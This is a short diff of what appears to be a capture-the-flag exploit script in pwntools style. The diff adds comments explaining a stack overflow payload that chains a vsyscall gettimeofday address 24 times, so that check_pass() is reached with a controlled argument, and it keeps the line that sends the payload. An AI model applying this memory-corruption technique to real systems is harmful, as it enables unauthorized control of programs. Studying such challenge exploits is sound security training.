@@ -66,7 +66,13 @@ pop_rbx = p64(0xdeadbeefdeadbeef)
 pop_rbp = p64(0xcafebabecafebabe)
 sys_gettimeofday = p64(0xffffffffff600400)
 
-payload = buf_on_stack + pop_rbx + pop_rbp + sys_gettimeofday*24  # 24 times of gettimeofday()
+#
+# after 24 times of gettimeofday(), 
+# check_pass() will be called with corrupted 'rdi' returned by gettimeofday().
+# if we can supply correct 'timeval', bingo!
+#
+
+payload = buf_on_stack + pop_rbx + pop_rbp + sys_gettimeofday*24  
 
 r.send(payload + '\n')
 
